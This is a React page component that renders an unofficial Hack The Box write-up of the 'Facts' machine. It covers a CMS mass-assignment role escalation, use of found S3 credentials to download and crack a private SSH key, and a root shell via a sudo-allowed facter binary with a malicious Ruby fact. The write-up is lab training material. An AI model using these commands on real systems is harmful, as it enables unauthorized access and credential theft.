'use client'

import { Share2 } from 'lucide-react'
import { useState } from 'react'
import { CodeBlock, InlineCode } from '@/components/code-block'
import { SplitViewWrapper } from '@/components/split-view-wrapper'
import { assetPath } from '@/lib/asset-path'

interface WriteupContentProps {
  writeup: any
}

export function HtbFactsContent({ writeup }: WriteupContentProps) {
  const [copied, setCopied] = useState(false)

  return (
    <SplitViewWrapper>
      <article className="w-full max-w-3xl mx-auto px-6 py-20">
      <div className="text-center mb-8">
        <p className="text-sm font-mono text-zinc-400">02/02/2026</p>
      </div>

      <h1 className="text-4xl md:text-5xl font-light text-center mb-6 font-mono leading-tight">
        {writeup.title}
      </h1>

      <div className="text-center mb-8 space-y-4">
        <p className="text-sm text-zinc-400 font-mono">Non-Official Writeup | HTB Season 10</p>
        
        <div className="flex items-center justify-center gap-2">
          <Share2 size={16} className={copied ? "text-green-500" : "text-red-500"} />
          <button 
            onClick={() => {
              navigator.clipboard.writeText(window.location.href)
              setCopied(true)
              setTimeout(() => setCopied(false), 2000)
            }}
            className={`text-sm font-mono transition-colors ${
              copied ? "text-green-500" : "text-red-500 hover:text-red-400"
            }`}
          >
            {copied ? "Copied!" : "Share"}
          </button>
        </div>
      </div>

      <div className="text-center mb-16">
        <p className="text-3xl text-white-500 font-bold tracking-widest">
          بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
        </p>
      </div>

      <div className="mb-16">
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900">
          <img
            src={writeup.coverImage}
            alt={writeup.title}
            className="w-full h-96 object-cover"
          />
        </div>
      </div>
        
    {/* Introduction */}
    <p className="mb-8">
        Hello!! "Hackers" challenge writeup is finally here, this an easy linux challenge that involves an CVE exploitation to get admin privileges from normal user privileges via <InlineCode>Mass Assignment</InlineCode> vulnerability on common CMS (Content Management System), Enumeration until you find a sensitive information of <InlineCode>Amazon S3 Bucket</InlineCode> that contains a SSH key to access the machine, and finally privilege the escalation by exploitation a vulnerability binary with sudo rights without any password!!.
    </p>
    
    {/* Main Content */}
    <div className="space-y-8 text-lg leading-relaxed text-zinc-300">
        
        
        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Target Scanning"}
        </p>
        <p>
            First step is always scanning the target to find open ports and services running on those ports, for that I used nmap with the following command:
        </p>
        <CodeBlock 
          code="nmap -sS -A -Pn -p- -T4 --min-rate 1000 -oN nmap/initial_scan.txt <TARGET_IP>"
          language="bash"
        />
        <p>
            After the scan is complete, we can see that there are two open ports:        
        </p> 
        <ul className="list-disc list-inside space-y-2 ml-4">
          <li>
            <strong>Port 22/tcp (SSH):</strong> OpenSSH 9.9p1 Ubuntu. Standard for remote access.
          </li>
          <li>
            <strong>Port 80/tcp (HTTP):</strong> Nginx 1.26.3. The primary web interface.
          </li>
          <li>
            <strong>Port 54321/tcp (HTTP/MinIO):</strong> A Golang-based server identifying itself as MinIO. This is an S3-compatible object storage service. ( Amazon AWS Cloud storage service ).
          </li>
        </ul>   

         <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Target Enumeration"}
        </p>
        <p>
            Then we need to focus more on each port and the services running on those ports, starting with port 80 (HTTP)
        </p>
        <p>To expand the attack surface and exploring the application, we need to continue enumeration like directories, i've used gobuster with the following command</p>
        <CodeBlock 
          code="gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster/dir_enum.txt"
          language="bash"
        /> 
        <p>The Scan confirms the existence of: </p>
        
         
         
        <ul className="list-disc list-inside space-y-2 ml-4">
          <li>
            <strong>/admin::</strong> The CMS dashboard login.
          </li>
          <li>
            <strong>/search:</strong> Searching functionality.
          </li>
          <li>
            <strong>/ajax:</strong> API endpoints for dynamic content.
          </li>
        </ul>

        <p>Once we register to a new account we will notice we've assigned to a client role</p>
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/Update_Profile.png')}
            alt="Home page"
            className="w-full h-auto object-cover"
          />
        </div>
        
        <p>We saw the page source we will notice that there's multple roles in the application between client, admin, coordinator...etc.</p>   
        
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/roles.png')}
            alt="Roles in the application"
            className="w-full h-auto object-cover"
          />
        </div>
        
        <p>We can search for any CVE for the used CMS (Camaleon CMS v2.9.0) and we got <InlineCode>CVE-2025-2304</InlineCode>, Lets see in details</p>
        <p>in the change password function, if we tried to add more parameter to the request (role) and change its value to admin </p>
        
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/Mass_Assignment.png')}
            alt="Mass Assignment"
            className="w-full h-auto object-cover"
          />
        </div>
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/admin.png')}
            alt="Admin Role"
            className="w-full h-auto object-cover"
          />
        </div>

        <p>After some long enumeration i've found a sensitive AWS S3 Bucket Creds, so lets used and see what we gonna find.</p>
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/aws_config.png')}
            alt="AWS S3 Bucket Credentials"
            className="w-full h-auto object-cover"
          />
        </div>

        <p>I've used rclone tool to configure and interact with the AWS S3 Bucket.</p>
        <CodeBlock 
          code="rclone config"
          language="bash"
        /> 
        <p>After configuring the S3 Bucket with rclone, we can list the files in the bucket</p>
        <CodeBlock 
          code="rclone lsd facts.htb:"
          language="bash"
        /> 
        <p>And we can the following command to List the files inside a specific bucket</p>
        <CodeBlock 
          code={`rclone ls facts.htb:internal \
--s3-provider="Other" \
--s3-force-path-style \
--s3-no-check-bucket \
-vv`}
          language="bash"
        /> 
        
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/list_buckets.png')}
            alt="AWS S3 Bucket Credentials"
            className="w-full h-auto object-cover"
          />
        </div>
        
        <p>We can see a file named <InlineCode>.ssh/id_ed25519</InlineCode> which is a private SSH key, so lets download it and use it to access the machine via SSH.</p>
        <CodeBlock 
          code={`rclone copyto facts.htb:internal/.ssh/id_ed25519 ./id_ed25519 \
--s3-provider="Other" --s3-force-path-style`}
          language="bash"
        /> 
      
        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Initial Access"}
        </p>

        <p>Lets crack the hash to get the paraphrase of the key, I will use john the ripper</p>
        <CodeBlock 
          code={`ssh2john id_ed25519 > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash`}
          language="bash"
        /> 
        
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/john_crack.png')}
            alt="AWS S3 Bucket Credentials"
            className="w-full h-auto object-cover"
          />
        </div>

        <p>We can also use the following command to see the comments in the key file and we got the username from it</p>
        <CodeBlock 
          code="ssh-keygen -pf id_ed25519"
          language="bash"
        />

        <p>And then change the permissions of the key file and access the machine then get the user flag.</p>
        <CodeBlock 
          code={`chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb`}
          language="bash"
        />
        
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/user_flag.png')}
            alt="User Flag"
            className="w-full h-auto object-cover"
          />
        </div>
        
        <p className="text-center italic text-white-600 border-l-4 border-red-500 pl-6 py-4">
          {"Privilege Escalation"}
        </p>
        <p>After getting the user flag, we need to enumerate the machine for any possible privilege escalation vectors, so I ran the command sudo -l to get any sudo privileges for the user and we got a binary with sudo rights without a password.</p>
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/sudo.png')}
            alt="Sudo Rights"
            className="w-full h-auto object-cover"
          />
        </div>


        <p>If we din't know what this binary do like me?, you can ask AI about it and help you with the PrivEsc process.</p>
        <p>With little conversation with Gemini, I got these following commands to get the root shell and solve the challenge</p>
        <CodeBlock 
          code={`mkdir -p /dev/shm/pwn
echo 'Facter.add(:pwn) { setcode { exec("/bin/bash") } })' > /dev/shm/pwn/root.rb
sudo /usr/bin/facter --custom-dir /dev/shm/pwn`}
          language="bash"
          showLineNumbers={true}
        />
        <p>And then we get the root shell and the root flag.</p>
        <div className="w-full border-2 border-red-500/30 rounded-lg overflow-hidden bg-zinc-900 my-6">
          <img
            src={assetPath('/writeup-images/HTB_Facts/root_flag.png')}
            alt="Root Flag"
            className="w-full h-auto object-cover"
          />
        </div>

        <p>That's it for this writeup, hope you enjoyed it and learned something new. See you in the next one!</p>
    </div>
    
    </article>
    </SplitViewWrapper>
  )
}
